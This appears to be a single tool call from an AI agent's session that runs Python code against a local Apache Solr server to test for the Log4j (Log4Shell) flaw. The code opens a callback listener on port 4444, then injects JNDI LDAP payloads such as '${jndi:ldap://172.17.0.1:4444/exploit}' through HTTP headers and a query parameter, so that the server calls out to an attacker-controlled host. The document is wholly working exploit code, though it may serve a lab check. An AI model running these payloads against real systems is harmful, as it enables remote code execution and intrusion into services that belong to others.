  TOOL: execute_code
  | args: {"code": "\nimport socket\nimport threading\nimport time\nimport subprocess\n\n# Start a simple TCP listener on port 4444 to catch JNDI callbacks\ndef listener(results):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    s.bind(('0.0.0.0', 4444))\n    s.listen(1)\n    s.settimeout(10)\n    try:\n        conn, addr = s.accept()\n        data = conn.recv(1024)\n        results.append(f\"CALLBACK FROM {addr}: {data}\")\n        conn.close()\n    except socket.timeout:\n        results.append(\"NO CALLBACK (timeout after 10s)\")\n    finally:\n        s.close()\n\nresults = []\nt = threading.Thread(target=listener, args=(results,))\nt.start()\n\ntime.sleep(1)\n\n# Get our IP that the container can reach\n# Try host.docker.internal or the gateway\nimport os\n# Try multiple callback addresses\ntargets = [\n    \"host.docker.internal:4444\",\n    \"172.17.0.1:4444\", \n    \"host.containers.internal:4444\"\n]\n\n# Also check Solr version first\nimport urllib.request\ntry:\n    req = urllib.request.Request(\"http://localhost:8983/solr/admin/info/system?wt=json\")\n    resp = urllib.request.urlopen(req, timeout=5)\n    import json\n    data = json.loads(resp.read())\n    solr_version = data.get(\"solr_home\", \"unknown\")\n    jvm_version = data.get(\"jvm\", {}).get(\"version\", \"unknown\")\n    print(f\"Solr Info: JVM={jvm_version}\")\n    print(f\"Solr specVersion: {data.get('solr-spec-version', 'unknown')}\")\nexcept Exception as e:\n    print(f\"Solr info error: {e}\")\n\n# Send Log4j payloads with different callback addresses\nfor target in targets:\n    try:\n        payload = f\"${{jndi:ldap://{target}/exploit}}\"\n        req = urllib.request.Request(\n            \"http://localhost:8983/solr/admin/cores\",\n            headers={\"X-Api-Version\": payload, \"User-Agent\": payload}\n        )\n        resp = urllib.request.urlopen(req, timeout=5)\n        print(f\"Sent payload to {target}: HTTP {resp.status}\")\n    except Exception as e:\n        print(f\"Payload to {target} error: {e}\")\n\n# Also try the parameter-based injection\ntry:\n    import urllib.parse\n    payload = urllib.parse.quote(\"${jndi:ldap://172.17.0.1:4444/exploit}\")\n    url = f\"http://localhost:8983/solr/admin/cores?action={payload}\"\n    req = urllib.request.Request(url)\n    resp = urllib.request.urlopen(req, timeout=5)\n    print(f\"Param injection sent: HTTP {resp.status}\")\nexcept Exception as e:\n    print(f\"Param injection error: {e}\")\n\nt.join(timeout=12)\nfor r in results:\n    print(f\"LISTENER RESULT: {r}\")\n", "language": "python", "filename": "log4j_verify", "timeout": 30}
